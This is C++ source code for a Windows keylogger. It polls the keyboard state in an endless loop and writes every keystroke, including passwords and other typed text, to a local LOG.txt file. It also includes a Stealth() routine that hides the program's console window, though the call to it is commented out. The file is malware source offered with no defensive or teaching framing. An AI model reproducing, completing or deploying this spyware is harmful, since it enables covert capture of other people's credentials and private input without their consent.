#include <iostream>
#include<stdio.h>
#include<fstream>
using namespace std;
#include <windows.h>
#include <winuser.h>

int Save(int key_stroke, char *file);
void Stealth();

int main()
{
    //function that hides this program
    //Stealth();
    int i;

    while (1)
    {
        //scan for each character on the keyboard. if it is pressed write to file
        for(i = 8; i <= 255; i++)
        {
            //Get key State
            int p = GetAsyncKeyState(i);
            p = abs(p);
            //last bit of second no indicates whether key is up or down
            if ( p & 0x0001){
                Save(i,"LOG.txt");
            }
        }
    }

    system ("PAUSE");
    return 0;
}

/* *********************************** */

// takes a integer keystroke maps it to corresponding ascii and writes to file
int Save(int key_stroke, char *file)
{
    if ( (key_stroke == 1) || (key_stroke == 2) )
    return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    cout << key_stroke << endl;

    //keyboard buttons not depending on ascii value, buttons recorded using VK_ contants
    //F1 ..... F12 buttons
    if (key_stroke == VK_F1)
        fprintf(OUTPUT_FILE, "%s", "[F1]");
    else if (key_stroke == VK_F2)
        fprintf(OUTPUT_FILE, "%s", "[F2]");
    else if (key_stroke == VK_F3)
        fprintf(OUTPUT_FILE, "%s", "[F3]");
    else if (key_stroke == VK_F4)
        fprintf(OUTPUT_FILE, "%s", "[F4]");
    else if (key_stroke == VK_F5)
        fprintf(OUTPUT_FILE, "%s", "[F5]");
    else if (key_stroke == VK_F6)
        fprintf(OUTPUT_FILE, "%s", "[F6]");
    else if (key_stroke == VK_F7)
        fprintf(OUTPUT_FILE, "%s", "[F7]");
    else if (key_stroke == VK_F8)
        fprintf(OUTPUT_FILE, "%s", "[F8]");
    else if (key_stroke == VK_F9)
        fprintf(OUTPUT_FILE, "%s", "[F9]");
    else if (key_stroke == VK_F10)
        fprintf(OUTPUT_FILE, "%s", "[F10]");
    else if (key_stroke == VK_F11)
        fprintf(OUTPUT_FILE, "%s", "[F11]");
    else if (key_stroke == VK_F12)
        fprintf(OUTPUT_FILE, "%s", "[F12]");
    else if (key_stroke == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESC]");
    else if (key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "[NEWLINE]\n");
    else if (key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_LMENU || key_stroke == VK_RMENU)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (key_stroke == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPSLK]");
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_INSERT)
        fprintf(OUTPUT_FILE, "%s", "[INSERT]");
    else if (key_stroke == VK_SNAPSHOT)
        fprintf(OUTPUT_FILE, "%s", "[PrtSc]");
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_PRIOR)
        fprintf(OUTPUT_FILE, "%s", "[PgUp]");
    else if (key_stroke == VK_NEXT)
        fprintf(OUTPUT_FILE, "%s", "[PgDn]");


    else
    {
        // for the top line of 1-9 & 0 with shift key pressed
        if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 50))
        key_stroke = 64;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 54))
        key_stroke = 94;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 56))
        key_stroke = 42;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 55))
        key_stroke = 38;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 57))
        key_stroke = 40;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke >= 49 && key_stroke <= 57))
            key_stroke -= 16;
        else if((GetAsyncKeyState(16) & 0x8000) && (key_stroke == 48))
            key_stroke -= 7;

        // to write  small letters when shift is not pressed
        else if((!(GetAsyncKeyState(16) & 0x8000)) && (key_stroke >= 65 && key_stroke <= 90))
            key_stroke += 32;
        else if (key_stroke == VK_ADD)
            key_stroke = 43;
        else if (key_stroke == VK_SUBTRACT)
            key_stroke = 45;
        else if (key_stroke == VK_MULTIPLY)
            key_stroke = 42;
        else if (key_stroke == VK_DIVIDE)
            key_stroke = 47;
        else if (key_stroke == VK_DECIMAL)
            key_stroke = 46;

        //0-9 numpads
        else if(key_stroke == VK_NUMPAD0)
        key_stroke = 48;
        else if(key_stroke == VK_NUMPAD1)
        key_stroke = 49;
        else if(key_stroke == VK_NUMPAD2)
        key_stroke = 50;
        else if(key_stroke == VK_NUMPAD3)
        key_stroke = 51;
        else if(key_stroke == VK_NUMPAD4)
        key_stroke = 52;
        else if(key_stroke == VK_NUMPAD5)
        key_stroke = 53;
        else if(key_stroke == VK_NUMPAD6)
        key_stroke = 54;
        else if(key_stroke == VK_NUMPAD7)
        key_stroke = 55;
        else if(key_stroke == VK_NUMPAD8)
        key_stroke = 56;
        else if(key_stroke == VK_NUMPAD9)
        key_stroke = 57;

        //all oem keys + shift that is [ ] ; ' \ , . / - =
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_MINUS)
        key_stroke = 95;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_PLUS)
        key_stroke = 43;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_3)
        key_stroke = 126;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_4)
        key_stroke = 123;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_6)
        key_stroke = 125;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_5)
        key_stroke = 124;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_1)
        key_stroke = 58;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_7)
        key_stroke = 34;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_COMMA)
        key_stroke = 60;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_PERIOD)
        key_stroke = 62;
        else if((GetAsyncKeyState(16)) && key_stroke == VK_OEM_2)
        key_stroke = 63;

        //all oem keys that is [ ] ; ' \ , . / - =
        else if(key_stroke == VK_OEM_MINUS)
        key_stroke = 45;
        else if(key_stroke == VK_OEM_PLUS)
        key_stroke = 43;
        else if( key_stroke == VK_OEM_3)
        key_stroke = 96;
        else if( key_stroke == VK_OEM_4)
        key_stroke = 91;
        else if(key_stroke == VK_OEM_6)
        key_stroke = 93;
        else if(key_stroke == VK_OEM_5)
        key_stroke = 92;
        else if(key_stroke == VK_OEM_1)
        key_stroke = 59;
        else if(key_stroke == VK_OEM_7)
        key_stroke = 39;
        else if(key_stroke == VK_OEM_COMMA)
        key_stroke = 44;
        else if(key_stroke == VK_OEM_PERIOD)
        key_stroke = 46;
        else if( key_stroke == VK_OEM_2)
        key_stroke = 47;

        fprintf(OUTPUT_FILE, "%s", &key_stroke);
    }

    fclose (OUTPUT_FILE);
    return 0;
}

/* *********************************** */

void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
}
